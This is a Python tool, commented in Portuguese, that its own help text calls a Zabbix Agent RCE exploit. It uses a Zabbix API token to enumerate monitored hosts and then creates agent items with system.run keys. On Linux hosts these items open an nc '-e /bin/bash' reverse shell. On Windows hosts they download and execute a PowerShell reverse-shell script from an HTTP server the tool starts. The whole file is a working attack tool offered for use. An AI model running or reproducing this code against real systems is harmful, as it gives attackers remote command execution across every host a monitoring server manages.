import requests
import json
import base64
import os
import subprocess
import time
import argparse
import logging
from dotenv import load_dotenv
from pathlib import Path

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zabbix_rce.log')
    ]
)
logger = logging.getLogger('zabbix_rce')

# Carrega variáveis de ambiente do arquivo .env
load_dotenv()

# Configurações do Zabbix
ZABBIX_URL = os.getenv('ZABBIX_URL', 'http://127.0.0.1:8080/api_jsonrpc.php')
AUTH_TOKEN = os.getenv('AUTH_TOKEN', '')
HEADERS = {'Content-Type': 'application/json'}

# Configurações do servidor de callback
IP_SHELL = os.getenv('IP_SHELL', '127.0.0.1')
PORT_SERVER_PYTHON = int(os.getenv('PORT_SERVER_PYTHON', 9000))

# Palavras-chave para detectar sistemas Linux
PALAVRAS_CHAVE_LINUX = [
    "server_linux", "linux", "ubuntu", "debian", "centos",
    "redhat", "arch", "fedora", "suse", "unix", "kali", "mint"
]


class ZabbixRCE:
    def __init__(self):
        self.http_server_process = None

    def gerar_payload_windows(self, port_shell):
        """Gera o payload PowerShell para reverse shell no Windows"""
        payload_win = f"""
        do {{
            Start-Sleep -Seconds 1
            try {{
                $ClienteTCP = New-Object Net.Sockets.TCPClient("{IP_SHELL}", {port_shell})
            }} catch {{}}
        }} until ($ClienteTCP.Connected)

        $FluxoDeRede = $ClienteTCP.GetStream()
        $EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)

        function EscreverNoFluxo ($Texto) {{
            [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
            $EscritorDeFluxo.Write($Texto + 'SHELL> ')
            $EscritorDeFluxo.Flush()
        }}

        EscreverNoFluxo ''

        while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
            $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
            $SaidaDeComando = try {{
                Invoke-Expression $ComandoRecebido 2>&1 | Out-String
            }} catch {{
                $_ | Out-String
            }}
            EscreverNoFluxo ($SaidaDeComando)
        }}

        $EscritorDeFluxo.Close()
        """

        # Cria o diretório payloads se não existir
        os.makedirs('payloads', exist_ok=True)
        
        # Salva o payload em um arquivo
        with open("payloads/shell.ps1", 'w') as f:
            f.write(payload_win)
        
        logger.info(f"Payload Windows criado em payloads/shell.ps1")
        return True

    def iniciar_servidor_http(self, port=None):
        """Inicia um servidor HTTP na pasta atual para servir os payloads"""
        if port is None:
            port = PORT_SERVER_PYTHON
            
        # Encerra servidor anterior se estiver rodando
        self.encerrar_servidor_http()
        
        logger.info(f"Iniciando servidor HTTP na porta {port}")
        try:
            self.http_server_process = subprocess.Popen(
                ["python3", "-m", "http.server", str(port)], 
                cwd=os.path.join(os.getcwd(), "payloads")
            )
            return True
        except Exception as e:
            logger.error(f"Erro ao iniciar servidor HTTP: {e}")
            return False

    def encerrar_servidor_http(self):
        """Encerra o servidor HTTP se estiver rodando"""
        if self.http_server_process:
            logger.info("Encerrando servidor HTTP existente")
            self.http_server_process.terminate()
            self.http_server_process = None

    def listar_hosts(self):
        """Lista todos os hosts disponíveis no Zabbix com suas interfaces"""
        logger.info("Buscando hosts disponíveis no Zabbix...")
        
        data = {
            "jsonrpc": "2.0",
            "method": "host.get",
            "params": {
                "output": [
                    "hostid",
                    "host",
                    "name"
                ],
                "selectInterfaces": [
                    "interfaceid",
                    "ip",
                    "dns",
                    "port",
                    "type"
                ]
            },
            "auth": AUTH_TOKEN,
            "id": 2
        }

        try:
            response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(data), timeout=10)
            
            if response.status_code != 200:
                logger.error(f"Erro ao conectar na API: {response.status_code}, {response.text}")
                return None

            response_data = response.json()

            if "result" not in response_data:
                logger.error(f"Erro na resposta da API: {response_data}")
                return None
                
            logger.info(f"Encontrados {len(response_data['result'])} hosts")
            return response_data
            
        except requests.exceptions.RequestException as e:
            logger.error(f"Erro de conexão com o Zabbix API: {e}")
            return None

    def verificar_e_excluir_item(self, hostid, name):
        """Verifica se um item já existe e o exclui para evitar duplicação"""
        logger.info(f"Verificando se o item '{name}' já existe no host {hostid}")
        
        payload_get = {
            "jsonrpc": "2.0",
            "method": "item.get",
            "params": {
                "output": ["itemid"],
                "hostids": hostid,
                "search": {
                    "name": name
                }
            },
            "auth": AUTH_TOKEN,
            "id": 3
        }
        
        try:
            response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_get), timeout=10)
            items = response.json().get('result', [])
            
            if items:
                item_ids = [item['itemid'] for item in items]
                logger.info(f"Encontrados {len(item_ids)} itens para excluir")
                
                payload_delete = {
                    "jsonrpc": "2.0",
                    "method": "item.delete",
                    "params": item_ids,
                    "auth": AUTH_TOKEN,
                    "id": 4
                }
                delete_response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_delete), timeout=10)
                logger.info(f"Itens excluídos: {delete_response.json()}")
                return True
            else:
                logger.info("Nenhum item existente encontrado")
                return False
                
        except Exception as e:
            logger.error(f"Erro ao verificar/excluir itens: {e}")
            return False

    def implantar_linux_shell(self, hostid, interfaceid, porta):
        """Implanta shell reversa para sistemas Linux"""
        name = "nc_reverse_shell"
        self.verificar_e_excluir_item(hostid, name)
        
        payload_create = {
            "jsonrpc": "2.0",
            "method": "item.create",
            "params": {
                "name": name,
                "key_": f"system.run[nc.traditional {IP_SHELL} {porta} -e /bin/bash ,nowait]",
                "hostid": hostid,
                "type": 0,  # Zabbix agent
                "value_type": 3,  # Tipo de retorno (3 significa log)
                "interfaceid": interfaceid,
                "delay": "60s"
            },
            "auth": AUTH_TOKEN,
            "id": 5
        }
        
        try:
            response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create), timeout=10)
            result = response.json()
            
            if "result" in result:
                logger.info(f"Shell reversa Linux criada com sucesso: {result['result']}")
                return True
            else:
                logger.error(f"Erro ao criar shell reversa Linux: {result}")
                return False
                
        except Exception as e:
            logger.error(f"Exceção ao criar shell reversa Linux: {e}")
            return False

    def implantar_windows_shell(self, hostid, interfaceid, porta):
        """Implanta shell reversa para sistemas Windows"""
        # Gera o payload para Windows
        self.gerar_payload_windows(porta)
        
        name = "powershell_reverse_shell"
        self.verificar_e_excluir_item(hostid, name)
        
        payload_create = {
            "jsonrpc": "2.0",
            "method": "item.create",
            "params": {
                "name": name,
                "key_": f"system.run[powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{IP_SHELL}:{PORT_SERVER_PYTHON}/shell.ps1') | Invoke-Expression\",nowait]",
                "hostid": hostid,
                "type": 0,  # Zabbix agent
                "value_type": 3,  # Tipo de retorno (3 significa log)
                "interfaceid": interfaceid,
                "delay": "60s"
            },
            "auth": AUTH_TOKEN,
            "id": 5
        }
        
        try:
            response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create), timeout=10)
            result = response.json()
            
            if "result" in result:
                logger.info(f"Shell reversa Windows criada com sucesso: {result['result']}")
                return True
            else:
                logger.error(f"Erro ao criar shell reversa Windows: {result}")
                return False
                
        except Exception as e:
            logger.error(f"Exceção ao criar shell reversa Windows: {e}")
            return False

    def detectar_sistema_operacional(self, hostname):
        """Tenta detectar o sistema operacional com base no nome do host"""
        hostname_lower = hostname.lower()
        
        # Detecta Linux
        for keyword in PALAVRAS_CHAVE_LINUX:
            if keyword.lower() in hostname_lower:
                return "Linux"
                
        # Se contém "win", provavelmente é Windows
        if "win" in hostname_lower:
            return "Windows"
            
        # Caso não seja possível detectar
        return None

    def executar(self):
        """Função principal para execução do exploit"""
        logger.info("Iniciando exploração de RCE no Zabbix Agent...")
        
        # Inicia o servidor HTTP
        self.iniciar_servidor_http()
        
        try:
            # Lista hosts disponíveis
            response_data = self.listar_hosts()
            
            if not response_data or "result" not in response_data:
                logger.error("Não foi possível obter a lista de hosts. Verifique as credenciais e URL.")
                return
                
            # Lista hosts para seleção
            hosts = response_data['result']
            print("\n=== Hosts Disponíveis ===")
            
            for i, host in enumerate(hosts, 1):
                so_detectado = self.detectar_sistema_operacional(host['host']) or "Desconhecido"
                print(f"{i}. {host['host']} ({host['name']}) - SO Detectado: {so_detectado}")
                
                # Mostra interfaces disponíveis
                for j, interface in enumerate(host['interfaces'], 1):
                    print(f"   {j}. Interface: {interface['ip']} (ID: {interface['interfaceid']})")
            
            # Menu interativo
            while True:
                try:
                    escolha = input("\nEscolha um host (número) ou 'q' para sair: ")
                    
                    if escolha.lower() == 'q':
                        logger.info("Saindo do programa...")
                        break
                        
                    idx = int(escolha) - 1
                    if idx < 0 or idx >= len(hosts):
                        print("Índice inválido!")
                        continue
                        
                    host_selecionado = hosts[idx]
                    
                    # Seleção de interface
                    if len(host_selecionado['interfaces']) > 1:
                        interface_idx = int(input(f"Escolha uma interface (1-{len(host_selecionado['interfaces'])}): ")) - 1
                        if interface_idx < 0 or interface_idx >= len(host_selecionado['interfaces']):
                            print("Interface inválida!")
                            continue
                    else:
                        interface_idx = 0
                        
                    interfaceid = host_selecionado['interfaces'][interface_idx]['interfaceid']
                    
                    # Detecção automática de SO
                    so_detectado = self.detectar_sistema_operacional(host_selecionado['host'])
                    
                    # Menu de sistema operacional
                    print("\nSistema operacional detectado:", so_detectado or "Desconhecido")
                    print("1. Linux")
                    print("2. Windows")
                    print("3. Voltar")
                    
                    opcao_so = input("Confirme o sistema operacional (1, 2 ou 3): ")
                    
                    if opcao_so == "3":
                        continue
                        
                    # Porta para reverse shell
                    porta = int(input("Digite a porta para reverse shell: "))
                    
                    # Confirmação
                    confirm = input(f"Confirma implantação de shell reversa no host '{host_selecionado['host']}' na porta {porta}? (s/n): ")
                    if confirm.lower() != 's':
                        continue
                    
                    # Implantação da shell reversa
                    if opcao_so == "1":
                        logger.info("Preparando shell reversa para Linux...")
                        result = self.implantar_linux_shell(host_selecionado['hostid'], interfaceid, porta)
                    elif opcao_so == "2":
                        logger.info("Preparando shell reversa para Windows...")
                        result = self.implantar_windows_shell(host_selecionado['hostid'], interfaceid, porta)
                    else:
                        print("Opção inválida!")
                        continue
                        
                    if result:
                        print(f"\n[+] Shell reversa implantada! Execute 'nc -lvnp {porta}' para aguardar conexão.")
                    else:
                        print("\n[-] Falha ao implantar shell reversa.")
                        
                except ValueError:
                    print("Entrada inválida! Por favor, insira um número inteiro.")
                except Exception as e:
                    logger.error(f"Erro: {e}")
                    
        except KeyboardInterrupt:
            logger.info("\nOperação interrompida pelo usuário.")
        finally:
            self.encerrar_servidor_http()


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Zabbix Agent RCE Exploit')
    parser.add_argument('--verbose', '-v', action='store_true', help='Ativar modo verboso')
    parser.add_argument('--port', '-p', type=int, help='Porta do servidor HTTP')
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    
    # Configura log verboso se solicitado
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        
    # Verifica se o token de autenticação está presente
    if not AUTH_TOKEN:
        logger.error("Token de autenticação não encontrado. Configure-o no arquivo .env")
        exit(1)
        
    # Cria e executa a exploração
    exploit = ZabbixRCE()
    
    # Configura a porta do servidor HTTP se especificada
    if args.port:
        exploit.iniciar_servidor_http(args.port)
        
    exploit.executar()
